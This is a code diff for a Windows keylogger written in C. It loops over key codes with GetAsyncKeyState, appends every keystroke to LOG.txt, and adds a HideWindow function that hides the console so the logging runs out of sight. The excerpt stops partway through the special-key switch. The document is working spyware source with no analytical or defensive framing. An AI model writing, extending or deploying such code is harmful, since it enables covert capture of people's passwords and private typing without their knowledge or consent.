@@ -8,15 +8,19 @@ void KeystrokeHandler(short key, FILE* logfile);
 
 // MAIN FUNCTION //
 int main(){
-    
+    HideWindow();
     while(1){
         
+        Sleep(10); // reduce CPU usage
+
         // loop thru keyboard characters
         for(short key = 8; key <= 222; key++){
             
             // check for key press
             // where -32767 means key is pressed
             if(GetAsyncKeyState(key) == -32767){
+                
+                // open/create keylog file then handle keystroke
                 FILE* logfile;
                 logfile = fopen("LOG.txt", "a");
                 KeystrokeHandler(key, logfile);
@@ -28,13 +32,26 @@ int main(){
 }
 
 // FUNCTION DEFINITIONS //
+
+// hides the command prompt upon execution
+void HideWindow(){
+    HWND stealth;
+    AllocConsole();
+    stealth = FindWindowA("ConsoleWindowClass", NULL);
+    ShowWindow(stealth, 0); // set to 0 to not display
+}
+
+// writes to file the interpretation of keystroke
 void KeystrokeHandler(short key, FILE* logfile){
+    // upper case alphabet
     if( (key > 64 && key < 91) && GetAsyncKeyState(0x10)){
         fputc(key, logfile);
     }
+    // lower case alphabet
     else if(key > 64 && key < 91){
         fputc(key+32, logfile);
     }
+    // special characters, virtual keys, etc.
     else{
         switch(key){    
             case VK_SPACE: fputs("[SPACE]", logfile); break;
